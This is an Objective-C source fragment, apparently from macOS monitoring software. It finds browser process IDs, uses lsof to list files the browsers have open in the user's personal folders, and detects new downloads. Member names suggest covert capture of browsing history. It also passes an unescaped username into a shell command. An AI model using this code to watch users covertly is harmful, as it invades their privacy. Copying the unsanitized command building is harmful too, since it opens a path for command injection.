- (NSDate*)getDateFromString:(NSString*)inStrDate format:(NSString*)inFormat {
    NSDateFormatter* dtFormatter = [[NSDateFormatter alloc] init];
    [dtFormatter setLocale:[NSLocale systemLocale]];
    [dtFormatter setDateFormat:inFormat];
    NSDate* dateOutput = [dtFormatter dateFromString:inStrDate];
    [dtFormatter release];
    return dateOutput;
}

-(void)saveCurrentUser{
    self.mCurrentUserName = [SystemUtilsImpl userLogonName];
}

-(int)getPIDChrome{
    NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Google Chrome\")\n end tell"];
    NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
    [scptFrontmost release];
    return [[Result stringValue] intValue];;
}

-(int)getPIDSafari{
    NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"com.apple.WebKit.Networking\")\n end tell"];
    NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
    [scptFrontmost release];
    return [[Result stringValue] intValue];;
}

-(int)getPIDFirefox{
    NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Firefox\")\n end tell"];
    NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
    [scptFrontmost release];
    return [[Result stringValue] intValue];;
}

-(NSString *)getOnlyPath:(NSString *)aPath{
    NSString * fullPath = @"";
    NSRange range = [aPath rangeOfString:@"/" options:NSBackwardsSearch];
    if (range.location != NSNotFound) {
        NSRange fullRange = NSMakeRange(0, (range.location));
        fullPath = [aPath substringWithRange:fullRange];
        fullPath = [fullPath stringByReplacingOccurrencesOfString:@".download" withString:@""];
        return fullPath;
    }
    return @"";
}

-(NSString *)getOnlyFile:(NSString *)aPath{
    NSString * file = @"";
    NSRange range = [aPath rangeOfString:@"/" options:NSBackwardsSearch];
    if (range.location != NSNotFound) {
        NSRange fullRange = NSMakeRange( (range.location + 1), ( [aPath length] - range.location ) -1 );
        file = [aPath substringWithRange:fullRange];
        return file;
    }
    return @"";
}

-(NSMutableArray *)findFileRecentlyCreatedByPath:(NSString *)aPath {
    NSFileManager * fm = [NSFileManager defaultManager];
    BOOL isDirectory;
    if ([fm fileExistsAtPath:aPath isDirectory:&isDirectory]) {
        if (isDirectory) {
            NSArray *dirContents = [fm contentsOfDirectoryAtPath:aPath error:nil];
            NSMutableArray * returner = [[NSMutableArray alloc]init];
            for (int i=0; i < [dirContents count]; i++) {
                NSDictionary *attributes = [[NSDictionary alloc]initWithDictionary:[fm attributesOfItemAtPath:[NSString stringWithFormat:@"%@/%@",aPath,[dirContents objectAtIndex:i]] error:nil]];
                int diffTime = [[NSDate date] timeIntervalSince1970] - [[attributes objectForKey:@"NSFileModificationDate"]timeIntervalSince1970];
                if ( diffTime < 5 && ![[dirContents objectAtIndex:i]isEqualToString:@".DS_Store"] ){
                   
                    NSString * fileName = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%@/%@",aPath,[dirContents objectAtIndex:i]]];
                    [returner addObject:fileName];
                    [returner addObject:[attributes objectForKey:@"NSFileSize"]];
                    if (attributes) {
                        [attributes release];
                    }
                    [fileName release];
                    break;
                }
                [attributes release];
            }
            DLog(@"returner %@",returner);
            return [returner autorelease];
        }else{
            NSDictionary *attributes = [[NSDictionary alloc]initWithDictionary:[fm attributesOfItemAtPath:[NSString stringWithFormat:@"%@",aPath] error:nil]];
            NSMutableArray * returner = [[NSMutableArray alloc]init];
            NSString * fileName = [[NSString alloc]initWithString:aPath];
            [returner addObject:fileName];
            [returner addObject:[attributes objectForKey:@"NSFileSize"]];
            [attributes release];
            [fileName release];
            
            DLog(@"returner %@",returner);
            return [returner autorelease];
        }
    }
    return nil;
}

-(NSMutableArray *) getAllFileIsUsingWithPID :(int)aPID currentUser:(NSString *)aCurUser{

    NSString * command = [[NSString alloc]initWithString:[NSString stringWithFormat:@"lsof -n -P -p %d | grep '/Users/%@/Desktop\\|/Users/%@/Documents\\|/Users/%@/Downloads\\|/Users/%@/Movies\\|/Users/%@/Music\\|/Users/%@/Pictures\\|/Users/%@/Public' | awk '{out = $8\"<|>\"$7\"<|>\"; for(i=9;i<=NF;i++){if(i==9){out=out""$i}else{out=out\" \"$i}}; print out};' ",aPID,aCurUser,aCurUser,aCurUser,aCurUser,aCurUser,aCurUser,aCurUser]];
    NSString * container = [self runAsCommand:command];
    [command release];
    
    if ([container length]>0) {
        NSArray * spliter = [container componentsSeparatedByString:@"\n"];
        NSMutableArray * retuner = [[NSMutableArray alloc]init];
        for (int i=0; i < [spliter count];i++) {
            if ([[spliter objectAtIndex:i] length]>0) {
                [retuner addObject:[NSString stringWithFormat:@"%@",[spliter objectAtIndex:i]]];
            }
        }
        return [retuner autorelease];
    }
    return  nil;
}

#pragma mark #Regex

-(NSString *)regex:(NSString *)aReg withString:(NSString *)aString{
    NSError  *error = nil;
    NSRegularExpression* regex = [NSRegularExpression regularExpressionWithPattern: aReg options:0 error:&error];
    NSArray* matches = [regex matchesInString:aString options:0 range: NSMakeRange(0, [aString length])];
    NSString *matchString = @"";
    for (NSTextCheckingResult* match in matches) {
        matchString = [aString substringWithRange:[match range]];
    }
    return matchString;
}

#pragma mark #CommandRunner

- (NSString*) runAsCommand :(NSString *)aCmd {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    NSPipe* pipe = [NSPipe pipe];
    NSTask* task = [[NSTask alloc] init];
    [task setLaunchPath: @"/bin/sh"];
    [task setArguments:@[@"-c", aCmd]];
    [task setStandardOutput:pipe];
    
    NSFileHandle* file = [pipe fileHandleForReading];
    [task launch];
    
    NSData *data = [file readDataToEndOfFile];
    
    [task waitUntilExit];
    [task release];
    
    NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

    [file closeFile];
    
    [pool drain];
    
    return [result autorelease];
}

#pragma mark #Destroy

- (void)dealloc{
    [self stopCapture];
    [mHistory release];
    
    [mFilterSafari release];
    [mFilterChrome release];
    [mFilterFirefox release];
    
    [mFilterTimeStampSafari release];
    [mFilterTimeStampChrome release];
    [mFilterTimeStampFirefox release];
    
    [mDUFirefoxUrlInquirer release];
    [mCurrentUserName release];
    [super dealloc];
}
@end
